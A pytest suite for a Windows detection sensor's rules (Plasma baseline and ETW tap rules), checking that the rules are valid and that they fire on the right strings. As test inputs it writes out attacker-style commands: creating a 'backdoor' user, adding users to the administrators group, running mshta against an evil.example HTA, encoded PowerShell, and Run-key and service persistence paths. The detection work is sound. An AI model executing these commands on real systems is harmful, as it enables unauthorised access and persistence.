"""Detection-content tests: gene rules and tap rules must be valid AND behave.

These lock in the 1.0.0 FP/FN audit:
  * every baseline.gen line is valid JSON with compileable, correctly-escaped
    regexes (a JSON/regex escaping bug previously made the net-account-add
    rule unmatchable);
  * match / no-match behavior for the audited rules (positive and negative
    cases so an over-broad edit cannot silently return);
  * tap rules structural invariants that plasma-tap.render depends on
    (no '|' or newlines in fields, known severities, resolvable providers).
"""
import json
import re
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
BASELINE = REPO / "sensors" / "plasma-baseline.gen"
TAP_RULES = REPO / "sensors" / "plasma-tap-rules.json"

KNOWN_PROVIDERS = {
    "powershell": "Microsoft-Windows-PowerShell",
    "wmi": "Microsoft-Windows-WMI-Activity",
    "dns": "Microsoft-Windows-DNS-Client",
    "dotnet": "Microsoft-Windows-DotNETRuntime",
    "schannel": "Microsoft-Windows-Schannel",
    "security": "Microsoft-Windows-Security-Auditing",
}
KNOWN_SEVERITIES = {"low", "medium", "high", "critical"}


def _baseline_rules():
    return [json.loads(l) for l in BASELINE.read_text(encoding="utf-8").splitlines() if l.strip()]


def _match_expr(rule_match: str) -> "re.Pattern":
    """Extract the regex body from a gene match string like
    '$img: Image ~= '(...')'  and compile it."""
    body = rule_match.split("~=", 1)[1].strip().strip("'")
    return re.compile(body)


def _rule_by_name(rules, name):
    for r in rules:
        if r["Name"] == name:
            return r
    raise AssertionError(f"rule {name!r} missing from baseline.gen")


# ---------------------------------------------------------------------------
# structural validity
# ---------------------------------------------------------------------------

def test_baseline_every_line_is_valid_json_with_compileable_regex():
    rules = _baseline_rules()
    assert len(rules) == 15
    for obj in rules:
        assert obj["Meta"]["Schema"] == "1.0.0"
        assert obj["Meta"]["EventIDs"], obj["Name"]
        for m in obj["Matches"]:
            name, _, expr = m.partition(": ")
            assert name.startswith("$") and "~=" in expr, m
            _match_expr(m)  # raises re.error on bad regex


def test_baseline_conditions_reference_declared_matches():
    for obj in _baseline_rules():
        declared = {m.partition(":")[0].strip().lstrip("$") for m in obj["Matches"]}
        cond_vars = set(re.findall(r"\$(\w+)", obj["Condition"]))
        assert cond_vars <= declared, (obj["Name"], cond_vars, declared)


# ---------------------------------------------------------------------------
# behavioral: Plasma Net Account Add (was a dead rule — Image had trailing \s)
# ---------------------------------------------------------------------------

def test_net_account_add_fires_on_real_sysmon_image_path():
    rule = _rule_by_name(_baseline_rules(), "Plasma Net Account Add")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert img.search(r"C:\Windows\System32\net1.exe")
    assert img.search(r"C:\Windows\System32\net.exe")
    assert not img.search(r"C:\Users\bob\tools\net1.exe.bak")
    cmdline = "net1 user backdoor P@ss /add"
    assert add.search(cmdline)
    assert add.search("net  localgroup administrators bob /add")
    assert add.search("net user bob 'P@ss' add")


def test_net_account_add_does_not_fire_on_net_time():
    rule = _rule_by_name(_baseline_rules(), "Plasma Net Account Add")
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert not add.search("net time \\\\dc01 /domain")
    assert not add.search("net use Z: \\\\server\\share")


# ---------------------------------------------------------------------------
# behavioral: Mshta Network stays UNC/URL-scoped (no local-path matches)
# ---------------------------------------------------------------------------

def test_mshta_network_matches_remote_only():
    rule = _rule_by_name(_baseline_rules(), "Plasma Mshta Network")
    net = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$net"))
    assert net.search("mshta http://evil.example/x.hta")
    assert net.search("mshta https://evil.example/x.hta")
    assert net.search(r"mshta \\evil.example\share\x.hta")
    assert not net.search(r"mshta C:\Windows\Phishing\alert.hta")
    assert not net.search("mshta calc.hta")


# ---------------------------------------------------------------------------
# behavioral: Office spawn child set includes mshta; encoded cmd covers -ec
# ---------------------------------------------------------------------------

def test_office_spawn_covers_mshta_child():
    rule = _rule_by_name(_baseline_rules(), "Plasma Office Spawning Shell")
    child = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$child"))
    for exe in ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe"):
        assert child.search(rf"C:\Windows\System32\{exe}"), exe
    assert not child.search(r"C:\Windows\System32\notepad.exe")


def test_encoded_cmd_covers_short_and_long_forms():
    rule = _rule_by_name(_baseline_rules(), "Plasma Encoded Cmd")
    enc = _match_expr(rule["Matches"][0])
    assert enc.search("powershell -enc SQBFAFgA")
    assert enc.search("powershell -ec SQBFAFgA")
    assert enc.search("powershell -EncodedCommand SQBFAFgA")
    assert enc.search("powershell -encodedcommand SQBFAFgA")
    assert not enc.search("powershell -NoProfile -Command Get-Date")
    assert not enc.search(" powershellenc ")


# ---------------------------------------------------------------------------
# tap rules: renderer invariants (pipe format cannot round-trip these chars)
# ---------------------------------------------------------------------------

def test_tap_rules_structure_is_renderable():
    doc = json.loads(TAP_RULES.read_text(encoding="utf-8"))
    assert doc["version"] == 1
    assert set(doc["providers"]) == set(KNOWN_PROVIDERS)
    seen = set()
    for r in doc["rules"]:
        assert r["name"] not in seen, f"duplicate rule {r['name']}"
        seen.add(r["name"])
        assert r["provider"] in doc["providers"], r["name"]
        assert r["severity"] in KNOWN_SEVERITIES, r["name"]
        assert isinstance(r["event_id"], int) and r["event_id"] >= 0, r["name"]
        for field in ("substr", "field"):
            assert "|" not in r.get(field, ""), (r["name"], field)
            assert "\n" not in r.get(field, ""), (r["name"], field)
        assert r["technique"].startswith("T"), r["name"]


def test_tap_rules_security_channel_not_in_realtime_rules():
    """Audit events never re-appear on realtime ETW — identity.py owns them."""
    doc = json.loads(TAP_RULES.read_text(encoding="utf-8"))
    for r in doc["rules"]:
        assert r["provider"] != "security", r["name"]

# ---------------------------------------------------------------------------
# behavioral: 1.3.0 rules (rollup + fidelity release)
# ---------------------------------------------------------------------------

def test_file_delete_by_lolbin_matches_binaries_only():
    rule = _rule_by_name(_baseline_rules(), "Plasma File Delete by LOLBin")
    assert rule["Meta"]["EventIDs"] == [23, 26]
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    ext = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$ext"))
    assert img.search(r"C:\Windows\System32\powershell.exe")
    assert img.search(r"C:\Windows\System32\certutil.exe")
    assert not img.search(r"C:\Windows\explorer.exe")
    assert ext.search(r"C:\Users\bob\payload.exe")
    assert ext.search(r"C:\Users\bob\archive.7z")
    assert not ext.search(r"C:\Users\bob\notes.txt")


def test_run_key_persistence_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Run Key Persistence")
    reg = _match_expr(rule["Matches"][0])
    assert reg.search(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater")
    assert reg.search(r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Once1")
    assert not reg.search(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\X")


def test_service_registry_persistence_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Service Registry Persistence")
    svc = _match_expr(rule["Matches"][0])
    assert svc.search(r"HKLM\System\CurrentControlSet\Services\Evil\ImagePath")
    assert not svc.search(r"HKLM\System\CurrentControlSet\Control\Lsa")


def test_privileged_group_add_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Privileged Group Add")
    img = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$img"))
    add = next(_match_expr(m) for m in rule["Matches"] if m.startswith("$add"))
    assert img.search(r"C:\Windows\System32\net1.exe")
    assert add.search("net1 localgroup administrators bob /add")
    assert add.search("net localgroup administrators_2 svc /add")
    assert not add.search("net localgroup users bob /add")
    assert not add.search("net localgroup administrators")


def test_execution_from_user_paths_rule():
    rule = _rule_by_name(_baseline_rules(), "Plasma Execution From User Paths")
    img = _match_expr(rule["Matches"][0])
    assert img.search(r"C:\Users\bob\Downloads\setup.exe")
    assert img.search(r"C:\Users\bob\AppData\Local\Temp\a.exe")
    assert img.search(r"C:\Users\Public\drop.exe")
    assert not img.search(r"C:\Program Files\App\app.exe")

